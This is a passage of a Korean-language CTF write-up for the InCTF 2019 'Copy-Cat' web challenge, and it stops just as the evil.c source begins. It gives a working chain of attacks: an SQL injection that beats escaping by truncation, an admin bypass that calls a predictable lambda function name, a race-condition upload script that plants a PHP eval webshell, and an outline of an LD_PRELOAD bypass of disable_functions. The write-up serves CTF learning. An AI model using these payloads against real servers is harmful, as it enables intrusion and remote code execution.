      <pubDate>Tue, 24 Sep 2019 11:29:09 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/39398965/65524775-5a1cc980-df29-11e9-9237-b9fed69bff27.png&quot; alt=&quot;2019-09-24 오후 10-30-
        
      
      </description>
      
      <content:encoded><![CDATA[<p><img src="https://user-images.githubusercontent.com/39398965/65524775-5a1cc980-df29-11e9-9237-b9fed69bff27.png" alt="2019-09-24 오후 10-30-04"></p><p>해당 문제는 인도의 bi0s Team에서 주최한 <strong>InCTF 2019</strong>의 <strong>Copy-Cat</strong>이란 <strong>Web</strong> 문제입니다.</p><p>문제 풀면서 얻어간 것도 있고, 개인적으로는 해당 대회에서 가장 재밌게 푼 문제라 Write up을 작성하게 되었습니다.</p><hr><h1 id="문제분석"><a href="#문제분석" class="headerlink" title="문제분석"></a>문제분석</h1><p>문제 소스 :  <a href="https://github.com/JeonYoungSin/test/files/3652985/Copy-Cat.zip" target="_blank" rel="noopener">Copy-Cat.zip</a></p><p>해당 문제는 전체 소스코드를 제공해주는 화이트박스 형식의 문제였습니다. 소스코드 분석에 앞서 문제 사이트에 먼저 들어가보면 아래와 같이 간단한 로그인 기능만 보이는 것을 볼 수 있습니다.</p><p><img src="https://user-images.githubusercontent.com/39398965/65525784-07441180-df2b-11e9-9033-c8684693b5ff.png" alt="image"></p><p>해당 기능을 통해 뭘 해야하는지 다운받은 코드를 분석해보면 로그인 시 아래와 같은 형태로  <strong>계정명,비밀번호를 check 함수를 통해 검증</strong>하고 있는 것을 볼 수 있습니다.</p><p><strong>login.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"functions.php"</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$user = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$pass = $_POST[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line">$user = check($user);</span><br><span class="line">$pass = check($pass);   <span class="comment">//I know you are naughty!!</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT username, password FROM inctf2019_cat WHERE username='"</span> .$user .<span class="string">"' &amp;&amp; password='"</span> .$pass .<span class="string">"'"</span>;</span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span> || $_SESSION[<span class="string">'logged'</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">$_SESSION[<span class="string">'logged'</span>] = <span class="number">1</span>;</span><br><span class="line">header(<span class="string">"Location: admin.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Incorrect Credentials"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$conn-&gt;close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>check 함수에서 수행하는 동작은 아래와 같습니다. 먼저 <strong>real_escape_string</strong> 함수를 통해 ‘,”,\ 와 같은 특수문자에 <strong>\ (backslash)</strong>를 추가해 SQL Injection을 방어한 뒤 길이 값을 확인해 5~11 글자의 입력 값만 받는 것을 볼 수 있습니다.  </p><p><strong>config.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">..생략..</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $conn;</span><br><span class="line">    $str = $conn-&gt;real_escape_string($str);</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($tocheck)</span></span>&#123;</span><br><span class="line">  $tocheck = trim(escape($tocheck));</span><br><span class="line">  <span class="keyword">if</span>(strlen($tocheck)&lt;<span class="number">5</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"For God Sake, don't try to HACK me!!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(strlen($tocheck)&gt;<span class="number">11</span>)&#123;</span><br><span class="line">    $tocheck = substr($tocheck, <span class="number">0</span>, <span class="number">11</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $tocheck;</span><br><span class="line">&#125;</span><br><span class="line">..생략..</span><br></pre></td></tr></table></figure><p>여기서 해당 코드를 주의깊게 보면 <strong>입력 값의 길이가 11글자보다 크면 substr를 통해 입력 값을 자르는 걸 볼 수 있는데, 이를 통해  real_escape_string 함수를 통해 추가된 backslash를 무력화시켜 SQL Injetcion을 수행</strong>할 수 있게 됩니다. 공격 원리는 아래와 같습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username = 1234567890\ -&gt; real_escape_string  -&gt; 1234567890\\ -&gt; substr(1234567890\\,0,11) -&gt; 1234567890\</span><br></pre></td></tr></table></figure><p>위와 같이 substr을 통해 최종적으로 real_escape_string를 통해 추가된 \를 제거할 수 있고 추가로 password에 인젝션 구문을 넣어주면 <strong>SQL Injection을 통해 참 값</strong>을 만들 수 있게 됩니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">username = 1234567890\ , password =   or 1#</span><br><span class="line"></span><br><span class="line">result</span><br><span class="line">$sql = &quot;SELECT username, password FROM inctf2019_cat WHERE username=&apos;1234567890\&apos; &amp;&amp; password=&apos; or 1#&apos;;</span><br></pre></td></tr></table></figure><hr><p>이제 해당 payload로 로그인에 성공해 admin.php 페이지에 가게되면 “<strong>Sorry, It seems you are not Admin…are you? If yes, proove it then !!</strong>“ 란 메시지가 저희를 반겨줍니다. 뭐가 문젠지 코드를 다시보면 </p><p><strong>functions.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">..생략..</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_admin</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>($_SESSION[<span class="string">'admin'</span>]!=<span class="string">"True"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Sorry, It seems you are not Admin...are you? If yes, proove it then !!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">..생략..</span><br></pre></td></tr></table></figure><p>세션에 admin 값이 True로 세팅되어 있어야 하는 것을 볼 수 있습니다. 그럼 이제 해당 값이 언제 True로 세팅되는지 전체 코드에서 검색해보면 아래와 같은 형태의 로직이 존재하는 것을 볼 수 있습니다.</p><p><strong>remote_admin.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"functions.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">is_login();</span><br><span class="line"></span><br><span class="line"><span class="comment"># If admin wants to open his website remotely</span></span><br><span class="line"></span><br><span class="line">$remote_admin = create_function(<span class="string">""</span>,<span class="string">'if(isset($_SERVER["HTTP_I_AM_ADMIN"]))&#123;$_SERVER["REMOTE_ADDR"] = $_SERVER["HTTP_I_AM_ADMIN"];&#125;'</span>);</span><br><span class="line"></span><br><span class="line">$random = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"function admin_$random() &#123;"</span></span><br><span class="line">  .<span class="string">"global \$remote_admin; \$remote_admin();"</span></span><br><span class="line">  .<span class="string">"&#125;"</span>);</span><br><span class="line"></span><br><span class="line">send($random);</span><br><span class="line"></span><br><span class="line">$_GET[<span class="string">'random'</span>]();    <span class="comment">//Only Admin knows next random value; You don't have to worry about HOW?</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]==<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">  $_SESSION[<span class="string">'admin'</span>] = <span class="string">"True"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>코드를 분석해보면 <code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code>를 통해 해당 페이지에 접근한 아이피가 127.0.0.1일 때만 세션 내 admin 값을 True로 세팅되는걸 볼 수 있습니다. 이를 가능하게 하려면 <code>$_SERVER[&quot;HTTP_I_AM_ADMIN&quot;]</code> 의 값을 127.0.0.1로 덮은 후 <code>create_function</code>을 통해 생성된 함수를 호출해주면 됩니다.</p><p>함수 호출과 같은 경우 PHP에선<strong><code>&quot;문자열&quot;();</code></strong> 형태로 함수 호출이 가능하기 때문에 <strong><code>$_GET[&#39;random&#39;]();</code></strong> 코드를 통해 함수 호출이 가능합니다. 이를 토대로 함수를 호출하려고 보면, <strong><code>create_function 함수를 통해 생성된 익명함수는 변수형태로 존재해 문자열 형태로 호출이 불가</code></strong>하고, 해당 함수를 호출해주는 <strong><code>admin_$random 함수는 $random 값이 랜덤한 값으로 요청시마다 세팅</code></strong>되기 때문에 호출이 불가한 것을 볼 수 있습니다.</p><p>이를 우회하기 위해 이것저것 생각해보다 php create_function의 소스코드를 분석해보았고 아래와 같은 사실을 알 수 있었습니다.</p><p><strong>zend_builtin_function.c</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define LAMBDA_TEMP_FUNCNAME"__lambda_func"</span></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; proto string create_function(string args, string code)</span></span><br><span class="line"><span class="comment">   Creates an anonymous function, and returns its name (funny, eh?) */</span></span><br><span class="line">ZEND_FUNCTION(create_function)</span><br><span class="line">&#123;</span><br><span class="line"> ..생략..</span><br><span class="line"></span><br><span class="line">function_name = zend_string_alloc(sizeof(<span class="string">"0lambda_"</span>)+MAX_LENGTH_OF_LONG, <span class="number">0</span>);</span><br><span class="line">ZSTR_VAL(function_name)[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">ZSTR_LEN(function_name) = snprintf(ZSTR_VAL(function_name) + <span class="number">1</span>, sizeof(<span class="string">"lambda_"</span>)+MAX_LENGTH_OF_LONG, <span class="string">"lambda_%d"</span>, ++EG(lambda_count)) + <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (zend_hash_add_ptr(EG(function_table), function_name, func) == <span class="keyword">NULL</span>);</span><br><span class="line">RETURN_NEW_STR(function_name);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">zend_hash_str_del(EG(function_table), LAMBDA_TEMP_FUNCNAME, sizeof(LAMBDA_TEMP_FUNCNAME)<span class="number">-1</span>);</span><br><span class="line">RETURN_FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>위 코드를 보면 <code>create_function 함수 호출 후 반환되는 값이 \x00lambda_%d 형태</code>인 것을 확인할 수 있었고, 실제 로컬에서 테스트해본결과 <strong><code>\x00lambda\_1,\x00lambda_2</code></strong> 형태의 문자열 형태로 익명 함수 name이 반환되는 걸 볼 수 있었습니다.</p><p>그럼 다시 문제코드로 돌아와, 우리는 아래와 같이 <code>$remote_admin</code> 변수에 담기는 <strong><code>익명 함수명의 문자열 값을 예측</code></strong>할 수 있기 때문에  <code>admin_$random() 함수의 호출 없이 익명 함수를 호출해 관리자 권한을 획득</code>할 수 있습니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$remote_admin = create_function(<span class="string">""</span>,<span class="string">'if(isset($_SERVER["HTTP_I_AM_ADMIN"]))&#123;$_SERVER["REMOTE_ADDR"] = $_SERVER["HTTP_I_AM_ADMIN"];&#125;'</span>);</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /remote_admin.php?random=%00lambda_1 HTTP/1.1</span><br><span class="line">Host: 3.15.186.158</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">I-AM-ADMIN: 127.0.0.1</span><br><span class="line">Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Cookie: PHPSESSID=2grnkh3472812hpf3jg4p2m5g6</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><hr><p>이제 admin 권한을 획득한 뒤 admin페이지에 다시 접근 하면 아래와 같은 <strong>업로드 기능</strong>이 존재합니다.</p><p><img src="https://user-images.githubusercontent.com/39398965/65532094-2e541080-df36-11e9-9231-a10bd6a7fab5.png" alt="image"></p><p>해당 기능을 수행하는 코드는 다음과 같습니다.</p><p><strong>upload.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"functions.php"</span>);</span><br><span class="line"></span><br><span class="line">is_login();</span><br><span class="line">is_admin();</span><br><span class="line"></span><br><span class="line">$SANDBOX = getcwd() . <span class="string">"/uploads/"</span> . md5(<span class="string">"xxSpyD3rxx"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>] . <span class="string">"xxxisbackxxx"</span>);</span><br><span class="line">@mkdir($SANDBOX);</span><br><span class="line">@chdir($SANDBOX);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])) &#123;</span><br><span class="line">  ExtractZipFile($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $SANDBOX);</span><br><span class="line">  CheckDir($SANDBOX);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"File is at: "</span> . <span class="string">"/uploads/"</span> . md5(<span class="string">"xxSpyD3rxx"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>] . <span class="string">"xxxisbackxxx"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>functions.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">..생략..</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ExtractZipFile</span><span class="params">($file,$path)</span></span>&#123;</span><br><span class="line">  $zip = <span class="keyword">new</span> ZipArchive;</span><br><span class="line">  <span class="keyword">if</span> ($zip-&gt;open($file) === <span class="keyword">TRUE</span>) &#123;</span><br><span class="line">    $zip-&gt;extractTo($path);</span><br><span class="line">    $zip-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CheckDir</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    $files = scandir($path);</span><br><span class="line">    <span class="keyword">foreach</span> ($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        $filepath = <span class="string">"$path/$file"</span>;</span><br><span class="line">        <span class="keyword">if</span> (is_file($filepath)) &#123;</span><br><span class="line">            $parts = pathinfo($file);</span><br><span class="line">            $ext = strtolower($parts[<span class="string">'extension'</span>]);</span><br><span class="line">            <span class="keyword">if</span> (strpos($ext, <span class="string">'php'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'pl'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'py'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'cgi'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'asp'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'js'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'rb'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">strpos($ext, <span class="string">'htaccess'</span>) === <span class="keyword">false</span> &amp;&amp;</span><br><span class="line">                strpos($ext, <span class="string">'jar'</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">                @chmod($filepath, <span class="number">0666</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                @chmod($filepath, <span class="number">0666</span>);    <span class="comment">// just in case the unlink fails for some reason</span></span><br><span class="line">                unlink($filepath);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($file != <span class="string">'.'</span> &amp;&amp; $file != <span class="string">'..'</span> &amp;&amp; is_dir($filepath)) &#123;</span><br><span class="line">            CheckDir($filepath);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">..생략..</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>코드 흐름은 다음과 같습니다.</p><p>업로드한 Zip 파일 압축 해제 -&gt; ./uploads/md5_hex_value/ 디렉토리에 압축된 파일들 생성 -&gt; 생성된 파일들의 확장자를 검증해 필터 대상인 경우 삭제</p><p>위 흐름대로라면 <strong>파일 생성 후 삭제</strong>가 이루어지며, 생성될 <strong>파일명 및 경로가 고정</strong>되어 있기 때문에 <strong>Race Condition</strong>이 가능해 집니다.</p><p>이를 통해 파일 업로드 마다 삭제되는 <strong>php 확장자 파일 호출이 가능</strong>해지며, <strong>웹쉘 업로드</strong>가 가능해집니다.</p><p>Race Condition 시 사용한 코드는 아래와 같습니다.</p><p><strong>youngsin.php</strong> (해당 파일을 압축해 youngsin.zip 생성)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">mkdir(<span class="string">"../youngsin/"</span>);</span><br><span class="line">file_put_contents(<span class="string">"../youngsin/webshell.php"</span>,<span class="string">'&lt;?php eval($_GET[0]);?&gt;'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"WebShell Path = "</span>.getcwd().<span class="string">"/../youngsin/webshell.php"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>raceCondition.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_zip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">        url = <span class="string">"http://3.15.186.158/upload.php"</span></span><br><span class="line">        multiple_files = [</span><br><span class="line">            (<span class="string">'file'</span>, (<span class="string">'foo.png'</span>, open(<span class="string">'C:\Users\Administrator\Desktop/1/youngsin.zip'</span>,<span class="string">"rb"</span>), <span class="string">'application/x-zip-compressed'</span>))]</span><br><span class="line">        header = &#123;<span class="string">"Cookie"</span>:<span class="string">"PHPSESSID=2grnkh3472812hpf3jg4p2m5g6"</span>&#125;</span><br><span class="line">        result =  requests.post(url,headers=header,files=multiple_files).text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_shell</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">1000</span>):</span><br><span class="line">        url = <span class="string">"http://3.15.186.158/uploads/e8d8a3c4bd79dbe75be52c8328e2f1bb/youngsin.php"</span></span><br><span class="line">        header = &#123;<span class="string">"Cookie"</span>: <span class="string">"PHPSESSID=2grnkh3472812hpf3jg4p2m5g6"</span>&#125;</span><br><span class="line">        result = requests.get(url, headers=header).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"404 Not Found"</span> <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">print</span> result</span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    threading.Thread(target=upload_zip,args=(<span class="string">''</span>)).start()</span><br><span class="line">    threading.Thread(target=get_shell, args=(<span class="string">''</span>)).start()</span><br></pre></td></tr></table></figure><p>Result<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebShell Path = /var/www/html/uploads/e8d8a3c4bd79dbe75be52c8328e2f1bb/../youngsin/webshell.php</span><br></pre></td></tr></table></figure></p><p>생성된 웹쉘에 접근해보면 <strong>정상적으로 웹쉘이 업로드</strong>된걸 볼 수 있습니다.</p><p><img src="https://user-images.githubusercontent.com/39398965/65533542-cb17ad80-df38-11e9-9b9e-368db0463a8e.png" alt="image"></p><hr><p>이제 웹쉘까지 올렸겠다 그냥 플래그 파일 읽으면 될 것 같지만 <strong>플래그 파일의 권한이 오직 실행권한만 존재</strong>하기 때문에 <strong>단순 File Function으로는 플래그를 획득할 수 없고 쉘을 따야했습니다.</strong></p><p>그럼 이제 쉘을 따기위해 호출가능한 함수를 찾아야하는데 <strong><code>disable_functions</code></strong>이 다음과 같이 세팅되어 있었습니다.</p><p><strong>disable_functions</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,proc_open,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,mail,fread,fopen,file_get_contents,readfile,chdir</span><br></pre></td></tr></table></figure><p>일단 기본적으로 <strong>php에서 지원하는 모든 쉘 관련 함수가 막혀</strong>있는걸 볼 수 있었습니다. 추가로 시도해볼만한 <strong>LD_PRELOAD</strong>를 이용한 기법과 같은 경우  <strong>putenv는 활성화</strong> 되어있지만 내부적으로 <strong>execve를 호출</strong>하는걸로 알려져있는 <strong>mail,imap_open,error_log,syslog가 막혀</strong>있었고, <strong>imagick 모듈과 같은 경우 따로 설치되어 있지 않아 사용이 불가</strong>했습니다.</p><p>여기서 추가로 다른방법같은게 있나 유심히 phpinfo 페이지를 확인하다보면 <strong>mbstring라는 확장 모듈이 설치</strong>되어 있는걸 볼 수 있습니다.</p><p><img src="https://user-images.githubusercontent.com/39398965/65534295-18484f00-df3a-11e9-937d-4e9b29a2eab6.png" alt="image"></p><p>해당 모듈이 설치된 경우 <strong>Multibyte character encoding을 지원하는 함수들 사용이 가능</strong>한데, 사용 가능한 함수 중 아래와 같이 <strong>mail함수와 매칭되는 mb_send_mail이 존재</strong>합니다.</p><p><img src="https://user-images.githubusercontent.com/39398965/65534875-38c4d900-df3b-11e9-807a-fa6827ba3945.png" alt="image"></p><p>해당 함수와 같은 경우 인코딩 부분을 제외하곤 mail함수와 동일한 형태로 수행될 것이기 때문에 <strong>내부적으로 execve를 통한 sendmail 호출</strong>이 이루어지고, <strong>disable_function에는 적용이 되어있지 않아 LD_PRELOAD 기법을 통해 쉘 획득</strong>이 가능해집니다.</p><p>LD_PRELOAD를 통해 쉘을 획득하는 방식은 간단하게 설명하면 아래와 같습니다.</p><ol><li>execve를 오버라이딩하는 공유 라이브러리 생성 (ex: gcc -shared -fPIC evil.c -o evil.so)</li><li>so 파일 업로드</li><li>php의 putenv를 통해 업로드한 so 파일을 LD_PRELOAD로 등록</li><li>php에서 내부적으로 execve를 호출하는 함수(ex:mail,imap_open,error_log 등) 호출</li></ol><p>추가적으로 해당 기법에 대해 궁금하신분들은 구글에 <strong>php ld_preload bypass</strong> 와 같은 형태로 검색하시면 좋은 자료가 많으니 참고해주시면 될 것 같습니다.</p><p>위 공격과정을 수행할 코드는 아래와 같습니다.</p><p><strong>evil.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 